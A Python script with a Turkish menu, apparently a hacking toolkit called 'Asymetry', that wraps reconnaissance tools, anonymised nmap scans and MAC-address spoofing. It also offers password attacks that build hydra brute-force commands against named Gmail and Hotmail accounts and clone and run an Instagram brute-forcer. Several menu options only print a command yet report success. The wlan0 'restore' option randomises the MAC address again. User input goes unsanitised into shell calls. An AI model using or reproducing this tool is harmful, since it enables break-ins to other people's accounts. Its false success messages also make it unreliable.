#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import os


os.system("clear")

print("""

                   \                              |
                  _ \    __| |   | __ `__ \   _ \ __|  __| |   |
                 ___ \ \__ \ |   | |   |   |  __/ |   |    |   |
               _/    _\____/\__, |_|  _|  _|\___|\__|_|   \__, |
                            ____/   version: 1.0.0        ____/

    |1 >>> Bilgi toplama
    |2 >>> MAC Değiştirme
    |3 >>> Zafiyet Analizi
    |4 >>> Parola Saldırıları
    |0 >>> Çık


""")

sec = input("""
    |>>> """)
sec = int(sec)


if sec == 1:
    print("""
    |1 >>> nmap
    |2 >>> anonim nmap (proxychains)
    |3 >>> dmitry
    |4 >>> nikto
    |5 >>> whois
    |6 >>> dirb
    |7 >>> dnsmap
    |0 >>> En başa dön
    """)

    sec1 = input("""
    |>>> """)
    sec1 = int(sec1)

    if sec1 == 1:
        ip = input("""
    | Hedef İP adresini girin --> """)
        print("nmap " + ip)
        print("""
    | nmap port taraması başarılı.""")

        enBasa = input("    | Başa git.[e / h] >>> ")

        if enBasa == "e" or enBasa == "E":
            os.system("python3 Asymetry.py")

        elif enBasa == "h" or enBasa == "H":
            os.system("clear")
            quit()

        else:
            os.system("clear")
            print("hata yaptınız.")
            quit()


    elif sec1 == 2:
        print("""
    |   TOR ağı bilgisayarınızda yüklü değilse yüklenmesi gerekmektedir.
    | Yüklenmezse anonim bir şekilde port taraması gerçekleştiremezsiniz.
    | TOR ağı bilgisayarınıza Yüklensin mi?

    |1 >>> Evet Yüklensin
    |2 >>> Hayır gerek duymuyorum başa dön
    |3 >>> Bilgisayarımda Tor ağı yüklü
        """)

        indir = input("""
    |>>> """)
        indir = int(indir)

        if indir == 1:
            os.system("apt-get install tor")
            os.system("service tor start")
            ip1 = input("""
    | Hedef İP adresini girin >>> """)
            print("proxychains nmap " + ip1)
            print("""
    | Tor ağı aktifleştirilmiştir.""")
            print("""
    | Anonim olarak nmap port taraması gerçekleştirilmiştir.""")


        elif indir == 2:
                os.system("python3 Asymetry.py")


        elif indir == 3:
                os.system("service tor start")
                ip1 = input("""
    | Hedef İP adresini girin >>> """)
                print("proxychains nmap " + ip1)
                print("""
    | Tor ağı aktifleştirilmiştir.""")
                print("""
    | Anonim olarak nmap port taraması gerçekleştirilmiştir.""")

        else:
            print("""
    | Yanlış bir şeyler yaptınız.""")

        enBasa = input("    | Başa git.[e / h] >>> ")

        if enBasa == "e" or enBasa == "E":
            os.system("python3 Asymetry.py")

        elif enBasa == "h" or enBasa == "H":
            os.system("clear")
            quit()

        else:
            os.system("clear")
            print("hata yaptınız.")
            quit()



    elif sec1 == 3:
        url = input("""
    | Hedef url (www.hedefsite.com) >>> """)
        print("dmitry " + url)
        print("""
    | Bilgi toplanmıştır.""")

        enBasa = input("    | Başa git.[e / h] >>> ")

        if enBasa == "e" or enBasa == "E":
            os.system("python3 Asymetry.py")

        elif enBasa == "h" or enBasa == "H":
            os.system("clear")
            quit()

        else:
            os.system("clear")
            print("hata yaptınız.")
            quit()


    elif sec1 == 4:
        url1 = input("""
    | Hedef url (www.hedefsite.com) >>> """)
        print("nikto " + url1)
        print("""
    | Bilgi toplanmıştır.""")

        enBasa = input("    | Başa git.[e / h] >>> ")

        if enBasa == "e" or enBasa == "E":
            os.system("python3 Asymetry.py")

        elif enBasa == "h" or enBasa == "H":
            os.system("clear")
            quit()

        else:
            os.system("clear")
            print("hata yaptınız.")
            quit()


    elif sec1 == 5:
        url2 = input("""
    | Hedef url (www.hedefsite.com) >>> """)
        print("whois " + url2)
        print("""
    | Bilgi toplanmıştır.""")

        enBasa = input("    | Başa git.[e / h] >>> ")

        if enBasa == "e" or enBasa == "E":
            os.system("python3 Asymetry.py")

        elif enBasa == "h" or enBasa == "H":
            os.system("clear")
            quit()

        else:
            os.system("clear")
            print("hata yaptınız.")
            quit()



    elif sec1 == 6:
        url3 = input("""
    | Hedef url (www.hedefsite.com) >>> """)
        print("dirb " + url3)
        print("""
    | Bilgi toplanmıştır.""")

        enBasa = input("    | Başa git.[e / h] >>> ")

        if enBasa == "e" or enBasa == "E":
            os.system("python3 Asymetry.py")

        elif enBasa == "h" or enBasa == "H":
            os.system("clear")
            quit()

        else:
            os.system("clear")
            print("hata yaptınız.")
            quit()


    elif sec1 == 7:
        os.system("clear")
        print("""
                   \                              |
                  _ \    __| |   | __ `__ \   _ \ __|  __| |   |
                 ___ \ \__ \ |   | |   |   |  __/ |   |    |   |
               _/    _\____/\__, |_|  _|  _|\___|\__|_|   \__, |
                            ____/                         ____/

                            [ dnsmap ]

    | dnsmap aracını indirmek istermisin?

    |1 >>> Evet indir ve aracı kullan
    |2 >>> Hayır Bilgisayarımda yüklü aracı kullan
    |0 >>> En Başa dön
        """)

        indir2 = input("""
        |>>> """)
        indir2 = int(indir2)

        if indir2 == 1:
            print("apt-get install dnsmap")
            url4 = input("""
    | Hedef url (www.hedefsite.com) >>> """)
            print("dnsmap " + url4)
            print("""
    | Bilgi toplanmıştır.""")

            enBasa = input("    | Başa git.[e / h] >>> ")

            if enBasa == "e" or enBasa == "E":
                os.system("python3 Asymetry.py")

            elif enBasa == "h" or enBasa == "H":
                os.system("clear")
                quit()

            else:
                os.system("clear")
                print("hata yaptınız.")
                quit()

        elif indir2 == 2:
            url4 = input("""
    | Hedef url (www.hedefsite.com) >>> """)
            print("dnsmap " + url4)
            print("""
    | Bilgi toplanmıştır.""")

            enBasa = input("    | Başa git.[e / h] >>> ")

            if enBasa == "e" or enBasa == "E":
                os.system("python3 Asymetry.py")

            elif enBasa == "h" or enBasa == "H":
                os.system("clear")
                quit()

            else:
                os.system("clear")
                print("hata yaptınız.")
                quit()



        elif indir2 == 0:
            os.system("python3 Asymetry.py")

        else:
            print("| Hata Yaptınız.")


    elif sec1 == 0:
        os.system("python3 Asymetry.py")

    else:
        print("""
    | Yanlış bir şeyler yaptınız""")




#                2 2 2 2 2 2 2 2





elif sec == 2:
    print("""
    | Kablolu internet bağlantısı        = eth0
    | Kablosuz(wifi) internet bağlantısı = wlan0

    |1 >>> eth0
    |2 >>> wlan0
    |3 >>> Mac adresini orjinaline çevir
    |0 >>> En başa dön
    """)

    sec2 = input("""
    |>>> """)
    sec2 = int(sec2)


    if sec2 == 1:
        print("ifconfig eth0 down")
        print("macchanger -r eth0")
        print("ifconfig eth0 up")
        print("""
    | Eğer ağınıza kablo ile bağlıysanız mac adresiniz random belirlendi""")

        enBasa = input("    | Başa git.[e / h] >>> ")

        if enBasa == "e" or enBasa == "E":
            os.system("python3 Asymetry.py")

        elif enBasa == "h" or enBasa == "H":
            os.system("clear")
            quit()

        else:
            os.system("clear")
            print("hata yaptınız.")
            quit()


    elif sec2 == 2:
        print("ifconfig wlan0 down")
        print("macchanger -r wlan0")
        print("ifconfig wlan0 up")
        print("""
    | Eğer ağınıza kablosuz(wifi) ile bağlıysanız mac adresiniz random belirlendi""")

        enBasa = input("    | Başa git.[e / h] >>> ")

        if enBasa == "e" or enBasa == "E":
            os.system("python3 Asymetry.py")

        elif enBasa == "h" or enBasa == "H":
            os.system("clear")
            quit()

        else:
            os.system("clear")
            print("hata yaptınız.")
            quit()


    elif sec2 == 3:
        print("""
        |1 >>> eth0
        |2 >>> wlan0
        """)
        ifaceSec = input("""
        |>>> """)
        ifaceSec = int(ifaceSec)
        if ifaceSec == 1:
            print("ifconfig eth0 down")
            print("macchanger -p eth0")
            print("ifconfig eth0 up")
            print("""
    | Eğer ağınıza kablo ile bağlıysanız mac adresiniz orjinaline çevrildi""")

            enBasa = input("    | Başa git.[e / h] >>> ")

            if enBasa == "e" or enBasa == "E":
                os.system("python3 Asymetry.py")

            elif enBasa == "h" or enBasa == "H":
                os.system("clear")
                quit()

            else:
                os.system("clear")
                print("hata yaptınız.")
                quit()



        elif ifaceSec == 2:
            print("ifconfig wlan0 down")
            print("macchanger -r wlan0")
            print("ifconfig wlan0 up")
            print("""
    | Eğer ağınıza kablosuz(wifi) ile bağlıysanız mac adresiniz orjinaline çevrildi""")

            enBasa = input("    | Başa git.[e / h] >>> ")

            if enBasa == "e" or enBasa == "E":
                os.system("python3 Asymetry.py")

            elif enBasa == "h" or enBasa == "H":
                os.system("clear")
                quit()

            else:
                os.system("clear")
                print("hata yaptınız.")
                quit()


        else:
            print("""
    | Yanlış bir şeyler yaptınız""")


    elif sec2 == 0:
        os.system("python3 Asymetry.py")



    else:
        print("""
    | Yanlış bir şeyler yaptınız""")



#              3 3 3 3 3 3 3




elif sec == 3:
    print("""
    |1 >>> skipfish
    |0 >>> En başa dön
    """)
    zsec = input("""
    |>>> """)
    zsec = int(zsec)


    if zsec == 1:
        os.system("clear")
        os.system("python3 skipfish.py")
        os.system("clear")

    elif zsec == 0:
        os.system("python3 Asymetry.py")

    else:
        print("| Hata Yaptınız.")



#              4 4 4 4 4 4 4



elif sec == 4:
    print("""
    |1 >>> Gmail hesaplarına parola saldırılası
    |2 >>> Hotmail hesaplarına parola saldırısı
    |3 >>> Instagram hesaplarına parola saldırısı
    |0 >>> En başa dön
    """)

    psec = input("    |>>> ")
    psec = int(psec)

    if psec == 1:
        print("""

        | Hedef gmail hesabını giriniz.
            """)
        gmailh = input("        |>>> ")

        print("""
        | World list'in bulunduğu dizini yazınız.(/root/Masaüstü/worldlist.txt)     """)
        wlist = input("""
        |>>> """)
        print("hydra -s 465 -S -v -V -l " + gmailh + " -P " + wlist + " -e ns -t 16 smtp.gmail.com smtp")
        print("""
    |   Aracın bulduğu sonuçlar bazen doğru olmayabilir ama aracımız iki üç denemeden sonra
    | hedefin hesabının şifresi worldlistimizde varsa şifreyi bulur.
            """)

        enBasa = input("    | Başa git.[e / h] >>> ")

        if enBasa == "e" or enBasa == "E":
            os.system("python3 Asymetry.py")

        elif enBasa == "h" or enBasa == "H":
            os.system("clear")
            quit()

        else:
            os.system("clear")
            print("hata yaptınız.")
            quit()


    elif psec == 2:
        print("""

        | Hedef Hotmail hesabını giriniz.
        """)
        hotmailh = input("        |>>> ")
        print("""
        | World list'in bulunduğu dizini yazınız.(/root/Masaüstü/worldlist.txt) """)
        wlist1 = input("        |>>> ")
        print("hydra -s 587 -S -v -V -l " + hotmailh + " -P " + wlist1 + " -e ns -t 16 smtp.live.com smtp")
        print("""
    |   Aracın bulduğu sonuçlar bazen doğru olmayabilir ama aracımız iki üç denemeden sonra
    | hedefin hesabının şifresi worldlistimizde varsa şifreyi bulur.
        """)
        enBasa = input("    | Başa git.[e / h] >>> ")

        if enBasa == "e" or enBasa == "E":
            os.system("python3 Asymetry.py")

        elif enBasa == "h" or enBasa == "H":
            os.system("clear")
            quit()

        else:
            os.system("clear")
            print("hata yaptınız.")
            quit()


    elif psec == 3:
        print("""
    |1 >>> L0GIC
    |0 >>> Başa dön
        """)

        inn = input("    |>>> ")
        inn = int(inn)
        if inn == 1:
            print("""
        |1 >>> İndir ve kullan
        |2 >>> Kullan
        |0 >>> Başa dön
            """)
            indir = input("        |>>> ")
            indir = int(indir)
            if indir == 1:
                dizin = input("        | Nereye İndirilsin (/root/Masaüstü) >>> ")
                os.chdir("{}".format(dizin))
                os.system("git clone https://github.com/Pure-L0G1C/Instagram.git")
                os.chdir("{}".format(dizin))
                os.system("pip3 install -r requirements.txt")
                print("    | instagram kullanıcı adı")
                kullanici_adi = input("    |>>> ")
                print("    | worldlist'in bulunduğu dizin. Ör:(/root/Masaüstü/worldlist.txt)")
                kullanici_wordlist = input("    |>>> ")
                print("""
    | Mod seç

    |1 >>> Yavaş
    |2 >>> Orta (önerilen)
    |3 >>> Hızlı
                """)
                mode = input("    |>>> ")
                os.system("python3 instagram.py {} {} -m {}".format(kullanici_adi,kullanici_wordlist,mode))

            elif indir == 2:
                print("""
        | Program dizinini belirt. Ör:(/root/İndirilenler/Instagram)
            """)
                nerede = input("        |>>> ")
                os.chdir("{}".format(nerede))
                print("        | instagram kullanıcı adı")
                kullanici_adi = input("        |>>> ")
                print("        | worldlist'in bulunduğu dizin. Ör:(/root/Masaüstü/worldlist.txt)")
                kullanici_wordlist = input("        |>>> ")
                print("""
    | Mod seç

    |1 >>> Yavaş
    |2 >>> Orta (önerilen)
    |3 >>> Hızlı
                """)
                mode = input("    |>>> ")
                os.system("python3 instagram.py {} {} -m {}".format(kullanici_adi,kullanici_wordlist,mode))

            elif indir == 0:
                os.system("python3 Asymetry.py")

            else:
                print("Hata yaptınız.")




        elif inn == 0:
            os.system("python3 Asymetry.py")

        else:
            print("| Hata yaptınız."),



#              0 0 0 0 0 0 0

elif sec == 0:
    os.system("clear")
    quit()



else:
    print("| Yanlış bir şeyler yaptınız.")

##'👑 RLX👑 r00t#3940 yapımcı:
##iletişim bilgileri;
##discord '👑 RLX👑 r00t#3940 
## instagram : Emirbey069
##https://github.com/r00t22553##
